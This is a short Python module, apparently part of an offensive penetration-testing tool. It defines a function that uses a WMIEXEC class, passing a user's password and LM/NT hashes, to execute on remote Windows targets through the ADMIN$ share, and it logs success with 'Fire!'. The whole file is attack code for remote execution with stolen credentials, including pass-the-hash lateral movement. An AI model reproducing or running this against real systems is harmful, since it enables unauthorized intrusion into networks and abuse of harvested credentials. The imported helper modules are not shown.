# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import logging
import wmiexec
from core.Utils import *
from core.Colors import *
from core.Arch import *
from multiprocessing import Queue


def sprayLove(user, target, local_ip):
    try:
        exec_method = wmiexec.WMIEXEC('', user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, None, 'ADMIN$', False, False, None)
        logging.info("%s%s: %swmiexec%s seems to be an %sOK%s method. Fire!" % (infoYellow, target, green, white, green, white))
        exec_method.run(target, get_os_arch(target))
    except Exception as e:
        logging.info("%s%s: %swmiexec%s seems to be an %sKO%s method." % (infoYellow, target, red, white, red, white))
        logging.info("%s%s: %s" % (infoYellow, target, e))
